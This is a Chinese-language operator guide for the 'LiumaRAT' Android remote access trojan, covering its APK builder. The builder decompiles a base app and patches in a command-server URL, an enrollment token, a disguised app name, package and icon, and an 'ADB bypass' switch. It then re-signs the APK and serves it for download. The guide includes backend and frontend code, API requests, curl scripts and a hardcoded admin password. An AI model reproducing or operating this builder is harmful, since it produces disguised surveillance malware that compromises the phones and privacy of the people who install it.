# LiumaRAT APK 构建与下载完整指南

## 目录

1. [概述](#概述)
2. [系统架构](#系统架构)
3. [环境准备](#环境准备)
4. [APK 构建流程](#apk-构建流程)
5. [API 接口详解](#api-接口详解)
6. [前端使用流程](#前端使用流程)
7. [数据库存储](#数据库存储)
8. [故障排除](#故障排除)
9. [源代码位置](#源代码位置)

---

## 概述

LiumaRAT 提供了一个完整的 APK 动态构建和下载系统，允许用户：

- **动态配置** APK 参数（服务器地址、应用名称、包名等）
- **自动化构建** 流程（反编译、补丁、重建、签名）
- **即时下载** 生成的定制 APK 文件

该系统的核心特性：

- **实时进度推送** 通过 Socket.IO 获取构建进度
- **多参数支持** 支持自定义服务器、主页、应用名称、包名、版本号、应用图标
- **一次性令牌** 每个 APK 都获得唯一的引导令牌，用于设备注册
- **ADB 绕过选项** 可选启用高级 ADB 辅助功能
- **版本管理** 完整的 versionCode 和 versionName 支持

---

## 系统架构

### 整体流程图

```
用户 (前端)
   ↓
   ├─→ 填写 APK 配置 (服务器、应用名、包名等)
   ├─→ 上传应用图标 (可选)
   └─→ 点击"构建 APK"
       ↓
   后端 API: POST /api/builder/build
       ↓
   buildApkAsync() 异步任务启动
       ├─→ 检查前置条件 (Java, apktool, 签名工具)
       ├─→ 创建临时构建目录
       ├─→ 反编译基础 APK (apktool)
       ├─→ 修补 APK 配置 (Smali, AndroidManifest)
       ├─→ 重建 APK (apktool)
       ├─→ 签名 APK (uber-apk-signer)
       ├─→ 存储到数据库 (BLOB)
       ├─→ 清理临时文件
       └─→ 进度通知 via Socket.IO
       ↓
   用户下载 APK
       ↓
   GET /api/builder/download
       ↓
   后端查询最新构建记录
       ↓
   返回 APK 文件 (binary)
       ↓
   前端下载完成
```

### 核心组件

| 组件 | 位置 | 职责 |
|------|------|------|
| 构建路由 | `backend/src/routes/builder.ts` | 处理构建请求、进度推送、APK 下载 |
| 配置管理 | `backend/src/config/paths.ts` | 管理基础 APK、工具 jar 的路径 |
| 数据库模型 | `backend/src/db/schema.ts` | 定义 `build_records` 表结构 |
| 前端页面 | `frontend/src/pages/Builder.tsx` | 用户界面、表单、进度显示 |
| API 层 | `frontend/src/services/api.ts` | 前端 HTTP 请求封装 |

---

## 环境准备

### 1. 基础 APK

基础 APK 是所有构建的模板。项目已内置反编译并修补该 APK 以应用用户配置。

**路径:** `/workspaces/LiumaRAT/backend/app/factory/baseApp/Liuma.apk`

**大小:** 约 45 MB (debug 版本)

**来源:** 从项目 Android 应用编译生成
```bash
cd /workspaces/LiumaRAT/LIUMA
./gradlew assembleDebug
# 生成的 APK 位于: app/build/outputs/apk/debug/app-debug.apk
# 复制到 factory 目录作为基础 APK
cp app/build/outputs/apk/debug/app-debug.apk ../backend/app/factory/baseApp/Liuma.apk
```

### 2. APK 工具链

#### apktool.jar

用于反编译和重新打包 APK 文件。

**路径:** `/workspaces/LiumaRAT/backend/app/factory/apktool.jar`

**版本:** 2.11.1

**下载:**
```bash
cd /workspaces/LiumaRAT/backend/app/factory
wget https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar -O apktool.jar
```

**用法:**
```bash
# 反编译 APK
java -jar apktool.jar d input.apk -o output_dir -f

# 重新打包
java -jar apktool.jar b output_dir -o rebuilt.apk
```

#### uber-apk-signer.jar

用于对 APK 进行签名和对齐。

**路径:** `/workspaces/LiumaRAT/backend/app/factory/uber-apk-signer.jar`

**版本:** 1.3.0

**下载:**
```bash
cd /workspaces/LiumaRAT/backend/app/factory
wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O uber-apk-signer.jar
```

**用法:**
```bash
# 签名 APK
java -jar uber-apk-signer.jar --apks input.apk --overwrite
# 输出: input-aligned-debugSigned.apk
```

### 3. Java 运行时

**要求:** Java 17+ (项目使用 Java 17 编译)

**验证:**
```bash
java -version
# Expected: openjdk version "17.x.x"
```

### 4. 目录结构检查

```bash
ls -lh /workspaces/LiumaRAT/backend/app/factory/

# 预期输出:
# apktool.jar                  23M  (约 23 MB)
# uber-apk-signer.jar         3.1M  (约 3 MB)
# baseApp/
#   └─ Liuma.apk              45M  (约 45 MB)
```

---

## APK 构建流程

### 详细步骤分解

#### 1. 检查前置条件 (Checking)

**代码位置:** `backend/src/routes/builder.ts` 行 375-380

**检查项:**

| 检查项 | 路径 | 说明 |
|--------|------|------|
| Java | `java -version` | 必须安装 Java 17+ |
| Base APK | `backend/app/factory/baseApp/Liuma.apk` | 必须存在 |
| apktool | `backend/app/factory/apktool.jar` | 必须存在 |
| 签名工具 | `backend/app/factory/uber-apk-signer.jar` | 必须存在 |

**日志示例:**
```
[Builder] checking: Checking build prerequisites...
[Builder] Java found: openjdk version "25.0.2" 2026-01-20 LTS
```

#### 2. 反编译基础 APK (Decompiling)

**代码位置:** `backend/src/routes/builder.ts` 行 390

**步骤:**
```bash
java -jar apktool.jar d <base_apk> -o <decompile_dir> -f
```

**输出:**
```
tmp/fason-build-XXXXX/decompiled/
├── AndroidManifest.xml
├── res/
│   ├── values/
│   │   └── strings.xml
│   ├── mipmap-xxxhdpi/
│   │   ├── ic_launcher.png
│   │   ├── ic_launcher_background.png
│   │   └── ic_launcher_foreground.png
│   └── ...
└── smali/                      # Smali 字节码
    ├── smali/
    │   └── com/liuma/app/...
    ├── smali_classes2/
    └── smali_classes3/
```

**时间:** 约 10-15 秒

**日志示例:**
```
[Builder] decompiling: Decompiling base APK with apktool...
```

#### 3. 修补 APK 配置 (Patching)

**代码位置:** `backend/src/routes/builder.ts` 行 147-295

**修补内容:**

##### 3.1 服务器 URL 替换

- **原值:** `http://127.0.0.1:32766` (默认)
- **替换目标:** `SERVER_HOST` 字段在 `Config.java`
- **Smali 模式:**
  ```
  .field ... SERVER_HOST:Ljava/lang/String; = "..."
  ```
- **计数器:** `serverPatched` (预期 >= 2)

##### 3.2 主页 URL 替换

- **原值:** `https://google.com` (默认)
- **替换目标:** `HOME_PAGE_URL` 字段
- **Smali 模式:**
  ```
  .field ... HOME_PAGE_URL:Ljava/lang/String; = "..."
  ```
- **计数器:** `homePatched` (预期 >= 2)

##### 3.3 引导令牌替换

- **原值:** 服务器生成的一次性令牌
- **替换目标:** `BOOTSTRAP_TOKEN` 字段在 `Config.java`
- **Smali 模式:**
  ```
  const-string vX, "..."
  sput-object vX, Lcom/liuma/app/core/config/Config;->BOOTSTRAP_TOKEN:Ljava/lang/String;
  ```
- **计数器:** `tokenPatched` (预期 >= 1)

##### 3.4 包名替换 (如果不同)

- **原包名:** `com.liuma.app` (基础 APK)
- **新包名:** 用户指定的包名 (如 `com.example.app`)
- **替换范围:**
  - Smali 文件中的包名引用
  - AndroidManifest.xml 的 `package` 属性
  - 目录结构重命名: `smali/com/liuma/app` → `smali/com/example/app`

##### 3.5 应用图标替换 (如果上传)

- **输入:** 用户上传的 PNG/JPEG/WebP 图片
- **处理:**
  1. 使用 Sharp 库缩放到 432×432 (ADAPTIVE_SIZE)
  2. 生成前景图片 (288×288, SAFE_ZONE)
  3. 从边界采样生成背景颜色
  4. 生成自适应图标
- **输出位置:** `mipmap-xxxhdpi/`

##### 3.6 AndroidManifest.xml 修补

**修补项:**

```xml
<!-- 原始 -->
<manifest package="com.liuma.app" android:versionName="1.0.0">

<!-- 修补后 -->
<manifest package="com.example.app" android:versionName="2.0.1">
```

**代码位置:** 行 253-275

**修补内容:**
- `package` 属性 → 新包名
- `android:versionName` → 新版本号

##### 3.7 strings.xml 修补

```xml
<!-- 原始 -->
<string name="app_name">com.liuma.app</string>

<!-- 修补后 -->
<string name="app_name">TestAPK</string>
```

**代码位置:** 行 248-251

##### 3.8 ADB Assist Bypass 开关

**代码位置:** 行 280-288

**功能:** 在编译时启用或禁用高级 ADB 绕过逻辑

**Smali 字段:**
```
ENABLE_ADB_ASSIST_BYPASS:Z = true/false
```

**日志示例:**
```
[Builder] patching: Patching APK — Server: http://127.0.0.1:32766, Name: TestAPK, Package: com.example.app, Version: 1.0.0, ADB bypass: disabled...
[Builder] Smali patching: SERVER(2) HOME(2) BOOTSTRAP_TOKEN(1) PACKAGE(0)
[Builder] AndroidManifest.xml patched with package: com.example.app and versionName: 1.0.0
[Builder] Icon patched successfully
```

**时间:** 约 2-3 秒

#### 4. 重建 APK (Building)

**代码位置:** `backend/src/routes/builder.ts` 行 399-400

**步骤:**
```bash
java -jar apktool.jar b <decompile_dir> -o <output_apk>
```

**处理流程:**
1. 编译资源文件 (res/)
2. 处理 Smali 字节码
3. 生成 DEX 文件
4. 打包为 APK

**时间:** 约 15-20 秒

**日志示例:**
```
[Builder] building: Rebuilding APK with apktool...
```

#### 5. 签名 APK (Signing)

**代码位置:** `backend/src/routes/builder.ts` 行 404-405

**步骤:**
```bash
java -jar uber-apk-signer.jar --apks <output_apk> --overwrite
```

**处理流程:**
1. 生成调试签名 (debug key)
2. 对 APK 进行签名
3. 4 字节对齐 APK
4. 输出: `<filename>-aligned-debugSigned.apk`

**时间:** 约 1-2 秒

**日志示例:**
```
[Builder] signing: Signing APK with uber-apk-signer...
[Builder] Signed APK ready (43.07 MB), storing in database...
[Builder] signing: Build completed successfully!
```

#### 6. 存储到数据库

**代码位置:** `backend/src/routes/builder.ts` 行 417-427

**数据表:** `build_records`

**存储内容:**
```typescript
{
  serverUrl: "http://127.0.0.1:32766",
  homePageUrl: "https://google.com",
  appName: "TestAPK",
  status: "completed",
  apkData: <BLOB>,           // 二进制 APK 文件
  fileSize: 46137344,        // 字节数
  completedAt: "2026-08-12T14:00:07.000Z"
}
```

**数据库清理:** 仅保留最近 4 条记录 (防止数据库膨胀)

```sql
DELETE FROM build_records WHERE id NOT IN (
  SELECT id FROM build_records ORDER BY id DESC LIMIT 4
)
```

#### 7. 清理临时文件

**代码位置:** `backend/src/routes/builder.ts` 行 429

**清理内容:**
- 删除整个临时构建目录 (`/tmp/fason-build-XXXXX/`)
- 包括反编译文件、中间产物等

---

## API 接口详解

### 1. 构建 APK 接口

#### 请求

```http
POST /api/builder/build HTTP/1.1
Authorization: Bearer <jwt_token>
Content-Type: multipart/form-data

serverUrl=http://127.0.0.1:32766
homePageUrl=https://google.com
appName=TestAPK
packageName=com.example.app
versionName=1.0.0
adbAssistBypassMode=disabled
appIcon=<binary_file>
```

#### 请求参数

| 参数 | 类型 | 必需 | 说明 |
|------|------|------|------|
| `serverUrl` | string | 是 | APK 连接的服务器地址 (http/https) |
| `homePageUrl` | string | 是 | APK 打开时显示的主页 (http/https) |
| `appName` | string | 是 | 应用显示名称 (最多 50 字符) |
| `packageName` | string | 是 | 应用包名 (格式: com.example.app) |
| `versionName` | string | 是 | 版本号 (格式: 1.0.0 或 1.0.0-alpha) |
| `adbAssistBypassMode` | string | 否 | 是否启用 ADB 绕过 (enabled/disabled, 默认 disabled) |
| `appIcon` | file | 否 | 应用图标 PNG/JPEG/WebP (最大 5MB) |

#### 参数验证

```typescript
// 服务器 URL 验证
if (!serverUrl.match(/^https?:\/\/.+/)) 
  throw new Error('Invalid server URL');

// 主页 URL 验证
if (!homePageUrl.match(/^https?:\/\/.+/)) 
  throw new Error('Invalid home page URL');

// 应用名称验证
if (appName.trim().length === 0 || appName.trim().length > 50) 
  throw new Error('App name length invalid');

// 包名验证 (严格的 Android 包名格式)
if (!packageName.match(/^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/))
  throw new Error('Invalid package name format');

// 版本号验证
if (!versionName.match(/^[0-9]+(\.[0-9]+)*([\-_a-zA-Z0-9]+)?$/))
  throw new Error('Invalid version name format');
```

#### 响应

**成功 (200):**
```json
{
  "success": true,
  "message": "Build started"
}
```

**错误 (400-409):**
```json
{
  "success": false,
  "error": "Build validation failed: ..."
}
```

#### 授权检查

```typescript
// 需要 'builder:access' 权限
@requirePermission('builder:access')
```

**权限定义:** 参见 `backend/src/types/index.ts`

#### 异步构建

- 请求立即返回
- 构建在后台进行 (`buildApkAsync()`)
- 进度通过 Socket.IO 推送
- 构建失败时自动撤销注册

### 2. 取消构建接口

#### 请求

```http
POST /api/builder/cancel HTTP/1.1
Authorization: Bearer <jwt_token>
```

#### 响应

**成功 (200):**
```json
{
  "success": true,
  "message": "Build cancellation requested"
}
```

**无构建进行中 (404):**
```json
{
  "success": false,
  "error": "No build in progress"
}
```

#### 功能

- 设置 `buildState.cancelled = true`
- 杀死所有子进程
- 已启动的构建继续完成，但新的不会开始
- 注册的 enrollment 会被撤销

### 3. 下载 APK 接口

#### 请求

```http
GET /api/builder/download HTTP/1.1
Authorization: Bearer <jwt_token>
```

#### 响应

**成功 (200):**
```
Content-Type: application/vnd.android.package-archive
Content-Disposition: attachment; filename="TestAPK.apk"
Content-Length: 46137344

<binary_apk_data>
```

**无 APK 可用 (404):**
```json
{
  "success": false,
  "error": "No APK built yet"
}
```

#### 功能

- 查询数据库最新的已完成构建记录
- 返回 APK 的二进制数据
- 浏览器自动下载
- 每次下载都返回最新的 APK

#### 代码

```typescript
// 查询最新 APK
const record = d.select({ 
  id: buildRecords.id, 
  appName: buildRecords.appName, 
  apkData: buildRecords.apkData, 
  fileSize: buildRecords.fileSize 
})
  .from(buildRecords)
  .where(eq(buildRecords.status, 'completed'))
  .orderBy(desc(buildRecords.id))
  .limit(1)
  .get();

// 返回二进制数据
const apkBuffer = Buffer.from(record.apkData as Uint8Array);
reply.header('Content-Type', 'application/vnd.android.package-archive');
reply.header('Content-Disposition', `attachment; filename="${sanitizeFileName(record.appName)}.apk"`);
reply.header('Content-Length', record.fileSize || apkBuffer.length);
return reply.send(apkBuffer);
```

### 4. Socket.IO 进度事件

#### 事件名

```
builder:progress
```

#### 消息格式

```json
{
  "step": "decompiling|patching|building|signing",
  "message": "Decompiling base APK with apktool...",
  "complete": false,
  "error": null,
  "time": "2026-08-12T13:56:25.000Z",
  "appName": "TestAPK"
}
```

#### 事件序列

| 步骤 | complete | error | 说明 |
|------|----------|-------|------|
| checking | false | null | 检查前置条件 |
| decompiling | false | null | 反编译中 |
| patching | false | null | 修补中 |
| building | false | null | 重建中 |
| signing | false | null | 签名中 |
| signing | true | null | 完成成功 |
| signing | true | "..." | 完成失败 |

#### 客户端监听 (前端)

```typescript
// frontend/src/services/socket.ts
onBuilderProgress((progress: BuilderProgress) => {
  console.log(`${progress.step}: ${progress.message}`);
  if (progress.complete) {
    if (progress.error) {
      console.error(`Build failed: ${progress.error}`);
    } else {
      console.log('Build completed successfully!');
    }
  }
});
```

---

## 前端使用流程

### 界面组件

**文件:** `frontend/src/pages/Builder.tsx`

### 用户交互步骤

#### 1. 打开 Builder 页面

```
http://localhost:5173/builder
```

#### 2. 填写配置表单

| 字段 | 默认值 | 说明 |
|------|--------|------|
| 服务器地址 | http://127.0.0.1:32766 | APK 将连接到此服务器 |
| 主页地址 | https://google.com | APK 打开时显示的页面 |
| 应用名称 | 亚太科技 | 应用显示名称 |
| 包名 | com.liuma.app | Android 包名 |
| 版本号 | 1.0.0 | 应用版本 |
| 应用图标 | (无) | 可选上传自定义图标 |
| ADB Assist Bypass | 标准模式 | 可选启用高级绕过 |

#### 3. 上传图标 (可选)

```
支持格式: PNG, JPEG, WebP
最大大小: 5 MB
拖放或点击上传区域
```

#### 4. 点击"构建 APK"按钮

- 验证所有参数
- 发送 `POST /api/builder/build`
- 进入加载状态

#### 5. 监听构建进度

```
检查前置条件
  ↓
反编译 APK
  ↓
修补 APK
  ↓
重建 APK
  ↓
签名 APK
  ↓
构建完成!
```

每个步骤都会显示实时进度条和状态文本。

#### 6. 下载 APK

构建完成后，点击"下载 APK"按钮，浏览器自动下载文件。

### 前端 API 调用

#### 构建请求

```typescript
// frontend/src/services/api.ts
const formData = new FormData();
formData.append('serverUrl', serverUrl);
formData.append('homePageUrl', homePageUrl);
formData.append('appName', appName);
formData.append('packageName', packageName);
formData.append('versionName', versionName);
formData.append('adbAssistBypassMode', adbAssistBypassMode);
if (iconFile) {
  formData.append('appIcon', iconFile);
}

const res = await builderApi.build(formData);
```

#### 下载请求

```typescript
const res = await builderApi.downloadApk((progressEvent) => {
  const percent = Math.round((progressEvent.loaded * 100) / progressEvent.total);
  setDownloadProgress(percent);
});

// 创建下载链接
const url = window.URL.createObjectURL(new Blob([res.data]));
const link = document.createElement('a');
link.href = url;
link.setAttribute('download', `${appName}.apk`);
document.body.appendChild(link);
link.click();
```

---

## 数据库存储

### build_records 表结构

**文件:** `backend/src/db/schema.ts`

```typescript
export const buildRecords = sqliteTable('build_records', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  serverUrl: text('server_url').notNull(),
  homePageUrl: text('home_page_url').notNull(),
  appName: text('app_name').notNull().default('亚太科技'),
  status: text('status', { enum: ['completed', 'failed'] }).default('completed'),
  apkData: blob('apk_data'),
  fileSize: integer('file_size').default(0),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
  completedAt: text('completed_at'),
});
```

### 字段说明

| 字段 | 类型 | 说明 |
|------|------|------|
| `id` | INTEGER | 主键，自增 |
| `serverUrl` | TEXT | 构建时配置的服务器地址 |
| `homePageUrl` | TEXT | 构建时配置的主页地址 |
| `appName` | TEXT | 构建时的应用名称 |
| `status` | TEXT | 构建状态 (completed/failed) |
| `apkData` | BLOB | APK 文件的二进制数据 |
| `fileSize` | INTEGER | APK 文件大小 (字节) |
| `createdAt` | TEXT | 构建请求时间 |
| `completedAt` | TEXT | 构建完成时间 |

### 查询示例

```sql
-- 获取最新的已完成构建
SELECT * FROM build_records 
WHERE status = 'completed' 
ORDER BY id DESC 
LIMIT 1;

-- 统计构建数量
SELECT COUNT(*) FROM build_records;

-- 查询特定应用的所有构建
SELECT * FROM build_records 
WHERE appName = 'TestAPK' 
ORDER BY completedAt DESC;

-- 计算总的 APK 数据大小
SELECT SUM(fileSize) FROM build_records;
```

### 数据清理策略

```typescript
// 仅保留最近 4 条记录
d.run(sql`DELETE FROM build_records WHERE id NOT IN (
  SELECT id FROM build_records ORDER BY id DESC LIMIT 4
)`);
```

**原因:** 防止数据库无限增长，BLOB 字段占用大量磁盘空间

---

## 故障排除

### 常见错误

#### 1. "Base APK not found"

**原因:** 缺少基础 APK 文件

**解决:**
```bash
# 检查文件是否存在
ls -l /workspaces/LiumaRAT/backend/app/factory/baseApp/Liuma.apk

# 如果不存在，从 Android 项目编译
cd /workspaces/LiumaRAT/LIUMA
./gradlew assembleDebug
cp app/build/outputs/apk/debug/app-debug.apk ../backend/app/factory/baseApp/Liuma.apk
```

#### 2. "apktool.jar not found"

**原因:** 缺少 apktool

**解决:**
```bash
cd /workspaces/LiumaRAT/backend/app/factory
wget https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar -O apktool.jar
```

#### 3. "uber-apk-signer.jar not found"

**原因:** 缺少签名工具

**解决:**
```bash
cd /workspaces/LiumaRAT/backend/app/factory
wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O uber-apk-signer.jar
```

#### 4. "APK patch failed: bootstrap token initializer not found"

**原因:** 无法在反编译的 APK 中找到 BOOTSTRAP_TOKEN 字段

**检查步骤:**
```bash
# 手动反编译基础 APK
cd /tmp && mkdir test_decomp
java -jar /workspaces/LiumaRAT/backend/app/factory/apktool.jar d \
  /workspaces/LiumaRAT/backend/app/factory/baseApp/Liuma.apk \
  -o test_decomp -f

# 搜索 BOOTSTRAP_TOKEN
grep -r "BOOTSTRAP_TOKEN" test_decomp/smali*

# 查看 Config.java 的 Smali 代码
find test_decomp -name "Config.smali" -exec cat {} \;
```

**可能的解决:**
- 确保基础 APK 是从项目编译生成的
- 检查 `LIUMA/app/src/main/java/com/liuma/app/core/config/Config.java` 中是否包含 `BOOTSTRAP_TOKEN` 字段

#### 5. "Invalid package name format"

**原因:** 包名不符合 Android 命名规范

**规范:** 
- 必须全小写
- 只能包含字母、数字、下划线
- 必须至少有一个点
- 每个部分必须以字母开头

**有效示例:**
```
com.example.app
com.my_company.myapp
io.github.username.testapp
```

**无效示例:**
```
Com.example.app         # 包含大写
com.example.-app        # 包含特殊字符
com.123.app            # 部分以数字开头
comexampleapp          # 没有点
```

#### 6. "Invalid version name format"

**原因:** 版本号格式不正确

**规范:** 
- 必须以数字开头
- 可以有多个数字部分，用点分隔
- 可选的后缀 (字母/数字/下划线/连字符)

**有效示例:**
```
1.0.0
2.1
1.0.0-alpha
1.0.0_beta1
1.0.0-rc1
```

**无效示例:**
```
v1.0.0             # 不能以字母开头
1.0.0.             # 不能以点结尾
1..0.0             # 不能有连续的点
alpha1.0.0         # 不能以字母开头
```

#### 7. "Icon file too large"

**原因:** 上传的图标超过 5 MB

**解决:**
- 使用图片压缩工具 (ImageMagick, 在线工具等)
- 或简单跳过图标上传 (使用默认)

```bash
# 使用 ImageMagick 压缩
convert input.png -quality 80 -resize 800x800 output.png
```

#### 8. Socket.IO 连接失败

**原因:** WebSocket 连接问题

**检查:**
```bash
# 确保后端 Socket.IO 服务已启动
curl -i http://localhost:32766/socket.io/?transport=websocket

# 检查防火墙
netstat -tuln | grep 32766
```

### 调试技巧

#### 启用详细日志

```typescript
// backend/src/utils/logger.ts
log.level = 'debug';  // 打印所有日志级别
```

#### 手动测试 API

```bash
# 登录获取 token
TOKEN=$(curl -sS -X POST http://localhost:32766/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"s20041021"}' \
  | jq -r '.data.token')

# 触发构建
curl -X POST http://localhost:32766/api/builder/build \
  -H "Authorization: Bearer $TOKEN" \
  -F 'serverUrl=http://127.0.0.1:32766' \
  -F 'homePageUrl=https://google.com' \
  -F 'appName=TestAPK' \
  -F 'packageName=com.example.app' \
  -F 'versionName=1.0.0'

# 下载 APK
curl -X GET http://localhost:32766/api/builder/download \
  -H "Authorization: Bearer $TOKEN" \
  -o /tmp/output.apk

# 验证 APK
file /tmp/output.apk
unzip -l /tmp/output.apk | head -20
```

#### 检查临时文件

```bash
# 构建中会产生临时目录，通常在 /tmp/fason-build-*
ls -lhd /tmp/fason-build-*

# 查看反编译的文件结构
ls -la /tmp/fason-build-XXXXX/decompiled/
```

---

## 源代码位置

### 后端核心代码

| 文件 | 行数 | 功能 |
|------|------|------|
| `backend/src/routes/builder.ts` | 1-620 | 构建路由、APK 处理逻辑 |
| `backend/src/config/paths.ts` | 1-50 | 路径配置、资源发现 |
| `backend/src/db/schema.ts` | 109-118 | build_records 表定义 |
| `backend/src/services/deviceAuth.ts` | - | 设备注册令牌管理 |
| `backend/src/utils/adbBypass.ts` | - | ADB 绕过 Smali 补丁 |

### 前端核心代码

| 文件 | 行数 | 功能 |
|------|------|------|
| `frontend/src/pages/Builder.tsx` | 1-680 | 构建器 UI 主页面 |
| `frontend/src/services/api.ts` | 66-76 | API 调用封装 |
| `frontend/src/services/socket.ts` | - | Socket.IO 事件监听 |
| `frontend/src/locales/zh-CN.ts` | 281-308 | 中文本地化 |

### Android 源代码

| 文件 | 功能 |
|------|------|
| `LIUMA/app/src/main/java/com/liuma/app/core/config/Config.java` | 核心配置类，包含 SERVER_HOST、HOME_PAGE_URL、BOOTSTRAP_TOKEN 等 |
| `LIUMA/app/build.gradle` | APK 构建配置 |

### 配置文件

| 文件 | 说明 |
|------|------|
| `backend/src/db/schema.ts` | 数据库 schema 定义 |
| `backend/src/types/index.ts` | 权限和类型定义 |

---

## 总结

LiumaRAT 的 APK 构建和下载系统是一个完整的端到端解决方案：

1. **前端** 提供友好的配置界面
2. **API** 负责请求处理和参数验证
3. **后端** 执行复杂的 APK 修改逻辑
4. **数据库** 持久化构建结果
5. **Socket.IO** 实时推送进度

整个系统从参数输入到 APK 下载全程自动化，用户只需填写配置并点击按钮即可获得定制的 APK。

该指南涵盖了所有技术细节，可用于开发、部署、维护和故障排除。
